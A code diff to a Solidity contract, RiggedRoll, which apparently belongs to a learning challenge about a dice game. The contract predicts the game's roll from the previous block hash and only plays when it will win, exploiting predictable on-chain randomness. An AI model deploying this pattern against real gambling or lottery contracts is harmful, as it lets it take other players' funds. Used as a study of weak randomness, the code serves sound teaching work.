@@ -15,9 +15,9 @@ contract RiggedRoll is Ownable {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    function riggedRoll() external payable {
+    function riggedRoll() external  {
 
-        require(msg.value >= 0.002 ether, "Not enough Ether");
+        require(address(this).balance >= .002 ether, "not enough ether");
 
         // prepare to call rollTheDice
         bytes32 prevHash = blockhash(block.number - 1);
@@ -25,12 +25,9 @@ contract RiggedRoll is Ownable {
         uint256 predictedRoll = uint256(hash) % 16;
 
         // Revert if roll is above 5
-        if(predictedRoll > 5) {
-            revert("Roll too high");
-        }
-        // Continue if roll is less than or equal to 5
-        (bool success,) = address(diceGame).call{value: msg.value}(abi.encodeWithSignature("rollTheDice()"));
-        require(success, "Dice roll failed.");
+        if(predictedRoll > 5) revert();
+        
+        diceGame.rollTheDice{ value: 0.002 ether }();
             
         nonce ++;
          
